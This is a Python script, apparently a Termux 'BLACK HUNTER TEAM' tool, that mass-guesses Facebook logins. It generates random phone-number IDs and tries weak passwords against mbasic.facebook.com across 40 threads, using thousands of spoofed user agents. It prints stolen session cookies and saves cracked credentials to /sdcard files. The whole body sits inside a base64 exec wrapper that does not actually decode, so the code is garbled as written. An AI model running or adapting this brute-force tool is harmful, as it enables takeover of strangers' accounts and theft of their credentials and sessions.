import base64
exec(base64.b64decode("from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import os,sys,time,json,random,re,string,platform,base64,platform,uuid
import requests,random,sys,json,os,re
from time import sleep
from os import system
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
import marshal
import zlib
import base64
from random import random as acak
from random import choice as pilih
from random import randint
from bs4 import BeautifulSoup
import requests as ress
from sys import exit as exit
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')
    os.system('pkg install espeak')
P = '\x1b[1;97m' # 
M = '\033[1;33m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;96m' # 
U = '\x1b[1;95m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
id = []
user = []
oks = []
cps = []
loop = 0
ugen=[]
url_lookup = "https://lookup-id.com/"
url_mb = "https://mbasic.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False
for xd in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='RMX3191 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome'
    d=random.randrange(10,200)
    e='0.4844.88 '
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/383.1.0.25.106;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
for xd in range(9000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='CPH2269 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/348.0.0.8.103;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
for ua in range(10000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      aJaber=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(aJaber)
for ua in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8','9','10','11','12','13','14','15'])
	c='itel S661LP Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	alhhaj=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(alhhaj)
os.system("xdg-open https://t.me/JAVA_SCIPT_KING")
logo =("""
\033[93;1m  ____        _    _   _______ ______          __  __ 
\033[1;32m |  _ \      | |  | | |__   __|  ____|   /\   |  \/  |
\033[91;1m | |_) |_____| |__| |    | |  | |__     /  \  | \  / |
\033[95;1m |  _ <______|  __  |    | |  |  __|   / /\ \ | |\/| |
\033[94;1m | |_) |     | |  | |    | |  | |____ / ____ \| |  | |
\033[93;1m |____/      |_|  |_|    |_|  |______/_/    \_\_|  |_| 

\33[1;32m====================================================
\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m AUTHOR  \033[1;91m : \033[1;95mZAHID HUSSAIN
\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m FACEBOOK\033[1;91m : \033[1;95mZAHID HUSSAIN
\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m GITHUB  \033[1;91m : \033[1;95mBLACK-HUNTER-TEAM
\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m TOOLS   \033[1;91m : \033[1;95mRANDOM
\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m VERSION \033[1;91m : \033[1;91m1.9.8
\33[1;32m====================================================""") 
 
def Jaber():
    os.system('clear')
    os.system('xdg-open https://facebook.com/groups/544684501030088/')
    print(logo)
    print("")
    print("\033[1;96m ╔═════════════════════════════════╗")
    print("\033[1;36m ║  \033[1;35m[\033[1;32m1\033[1;35m][\033[1;32mA\033[1;35m] \033[1;32m ᎡᎪΝᎠϴᎷ ᏟᏞϴΝᎬ ᏴᎠ        \033[1;36m║")
    print("\033[1;96m ╠═════════════════════════════════╣")
    print(" \033[1;36m║  \033[1;35m[\033[1;32m2\033[1;35m][\033[1;32mB\033[1;35m] \033[1;32m ᎫϴᏆΝ ᎷƳ ҒᏴ ᏀᎡϴႮᏢ       \033[1;36m║")
    print(" \033[1;36m║  \033[1;35m[\033[1;32m3\033[1;35m][\033[1;32mC\033[1;35m] \033[1;32m ᎫϴᏆΝ ᎷƳ MS ᏀᎡϴႮᏢ       \033[1;36m║")
    print("\033[1;36m ║  \033[1;35m[\033[1;32m0\033[1;35m][\033[1;32mX\033[1;35m] \033[1;32m ᎬХᏆͲ                   \033[1;36m║")
    print("\033[1;96m ╚═════════════════════════════════╝")
    print("")
    Jaber = input(f'\033[1;32m ՏᎬᏞᎬᏟͲᎬᎠ ƳϴႮᎡ ϴᏢͲᏆϴΝ :\033[1;36m ')
    if Jaber in ["1","A"]:
        Jabers()
    if Jaber in ["2","B"]:
        os.system('xdg-open https://facebook.com/groups/544684501030088/')
    if Jaber in ["3","C"]:
        os.system('xdg-open https://www.facebook.com/BCS.Bangladesh.Cyber.Export.Official')
    if Jaber in ["0","X"]:
        os.system('exit')

def Jabers():
    user=[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print("\033[1;91m╔════════════════════════════════════════════╗")
    print("\033[1;31m║\033[1;36m  ƳϴႮᎡ ՏᏆᎷ ᏟϴᎠᎬ : \033[1;31m[\033[1;32m016\033[1;31m] [\033[1;32m017\033[1;31m] [\033[1;32m018\033[1;31m] [\033[1;32m019\033[1;31m] \033[1;31m  ║")
    print("\033[1;91m╚════════════════════════════════════════════╝")
    code = input('\033[1;32m ƳϴႮᎡ ՏᏆᎷ ᏟϴᎠᎬ :\033[1;36m ')
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/BCS.Bangladesh.Cyber.Export.Official')
    print(logo)
    print("\033[1;91m╔════════════════════════════════════════════╗")
    print("\033[1;31m║\033[1;36m  ƳϴႮᎡ ᏟᎡᎪᏟᏦ ᏞᏆᎷᏆͲ : \033[1;31m[\033[1;32m3000\033[1;31m] [\033[1;32m5000\033[1;31m] [\033[1;32m10000\033[1;31m] \033[1;31m ║")
    print("\033[1;91m╚════════════════════════════════════════════╝")
    limit=int(input("\033[1;32m ƳϴႮᎡ ᏟᎡᎪᏟᏦ ᏞᏆᎷᏆͲ :\033[1;36m "))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=40) as Fb_crack:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print("\033[1;91m╔═════════════════════════════════════")
        print(f'\033[1;91m║\033[1;92m ƳϴႮᎡ ՏᏆᎷ ᏟϴᎠᎬ : '+code) 	    
        print(f'\033[1;91m║\033[1;92m ƳϴႮᎡ ͲϴͲᎪᏞ ᏆᎠ : '+tl)			     
        print(f'\033[1;91m║\033[1;92m BLACK HUNTER TEAM') 			      
        print("\033[1;91m╚═════════════════════════════════════")
        for love in user:
            pwx = [love,love[2:],code+love[:3],'FreeFire','Pubg123','TikTok','Alh4aj']
            uid = code+love
            Fb_crack.submit(Jaberm,uid,pwx,tl)
    print("\033[1;91m╔═══════════════════════════╗")
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HACKED COMPLETE ')
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HI IM JAHIED ')
    print("\033[1;91m╚═══════════════════════════╝")


def Jaberm(uid,pwx,tl):
    global loop
    global cps
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r \033[1;91m[\033[1;92mBH-TEAM\033[1;91m]⚜️[\033[1;92m%s\033[1;91m]⚜️[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://t.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?0',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'\033[1;96m[\033[1;92mBHT-OK\033[1;96m]\033[1;92m '+uid+' \033[1;96m◉\033[1;92m '+ps+'')
                print(f'\033[1;36mᏟϴϴᏦᏆᎬ : \033[1;35m'+coki)
                open('/sdcard/BHT-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;90m[BHT-ᏟᏢ] '+uid+' ◉ '+ps+' \n')
                open('/sdcard/BHT-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
    except:
        pass
 
Jaber()"))